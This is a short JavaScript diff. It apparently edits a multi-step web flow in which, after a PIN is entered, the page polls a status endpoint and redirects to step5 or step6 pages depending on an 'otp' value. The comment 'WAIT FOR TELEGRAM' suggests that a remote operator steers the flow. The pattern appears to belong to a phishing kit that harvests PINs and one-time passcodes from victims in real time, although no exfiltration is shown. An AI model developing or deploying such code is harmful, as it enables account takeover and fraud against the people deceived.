@@ -39,7 +39,7 @@ if (localStorage.getItem("firstProcess") === "yes") {
 }
 
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
-if (true){
+if (localStorage.getItem("fromPin") === "yes") {
 
     setInterval(async () => {
     
@@ -50,12 +50,12 @@ if (true){
 
             console.log("OTP STATUS:", data);
 
-            if (data.otp === 5) {
+            if (data.otp == 5) {
                 localStorage.removeItem("fromPin");
                 window.location.href = "step5.html";
             }
 
-            if (data.otp === 6) {
+            if (data.otp == 6) {
     window.location.href = "step6.html";
 }
 
